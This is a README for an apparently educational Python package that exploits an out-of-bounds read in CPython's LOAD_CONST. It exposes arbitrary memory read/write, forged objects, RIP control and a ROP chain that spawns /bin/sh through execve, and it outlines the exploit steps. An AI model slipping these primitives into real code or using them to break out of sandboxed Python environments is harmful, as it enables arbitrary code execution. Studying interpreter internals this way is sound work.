# unsafe-python

Memory-unsafe operations in pure CPython, gated behind safe context managers.

Exploits CPython's `LOAD_CONST` OOB bug to achieve `fakeobj`, arbitrary memory R/W, and code execution — all without `ctypes` or any C extensions.

**Supports CPython 3.8 — 3.11 only.** This is a toy / educational tool. Do not use in production.

## Install

```bash
pip install unsafe-python
```

## Usage

All unsafe operations are only available inside a `with Unsafe()` block:

```python
from unsafe_python import Unsafe

with Unsafe() as u:
    obj = [1, 2, 3]
    addr = u.addrof(obj)
    print(f"list object @ {hex(addr)}")

    mem = u.getmem()
    print(mem[addr:addr + 0x40])  # dump raw memory

# Outside the block — raises UnsafeContextError
u.addrof(obj)  # UnsafeContextError: Cannot call 'addrof' outside of an unsafe context.
```

### Dereference a null pointer

```python
with Unsafe() as u:
    mem = u.getmem()
    mem[0]  # Segmentation fault
```

### Jump to an address (set RIP)

```python
with Unsafe() as u:
    u.setrip(0xDEADBEEF)  # segfault, check dmesg
```

### Execute a ROP chain (Linux x86_64, requires /proc/self/maps)

```python
from unsafe_python import Unsafe

with Unsafe() as u:
    gadgets = u.find_gadgets()
    binsh = u.refbytes(b"/bin/sh\0")
    argv = u.refbytes(bytes(bytearray(u.p64a(binsh, 0))))

    u.do_rop(u.p64a(
        gadgets["pop rax; ret"], 59,          # SYS_EXECVE
        gadgets["pop rdi; ret"], binsh,        # filename
        gadgets["pop rsi; ret"], argv,         # argv
        gadgets["pop rdx; pop rbx; ret"], 0, 0,  # envp, junk
        gadgets["syscall; ret"],
    ))
```

## API

| Method | Description |
|---|---|
| `u.addrof(obj)` | Heap address of a Python object |
| `u.fakeobj(addr)` | Forge an object reference from an address |
| `u.getmem()` | `bytearray` view of entire process memory |
| `u.refbytes(data)` | Address of a `bytes` object's internal buffer |
| `u.setrip(addr)` | Jump to an arbitrary address |
| `u.find_gadgets()` | Search libc for ROP gadgets |
| `u.do_rop(payload)` | Execute a ROP chain |
| `Unsafe.p64a(*n)` | Pack 64-bit ints to bytes (static, no context needed) |
| `Unsafe.u64(buf)` | Unpack bytes to int (static, no context needed) |

## How it works

See the [original writeup](https://github.com/dbuchwald/unsafe-python) for the full explanation. In short:

1. `LOAD_CONST` has no bounds check — we craft code objects that read OOB from `co_consts`
2. Heap grooming places a `bytes` buffer adjacent to a `tuple`, letting the OOB read hit attacker-controlled data
3. This gives a `fakeobj` primitive — forge any Python object from raw bytes
4. A fake `bytearray(base=0, len=SSIZE_MAX)` gives full memory R/W
5. Patching `tp_call` on a fake type object gives arbitrary code execution

## License

MIT
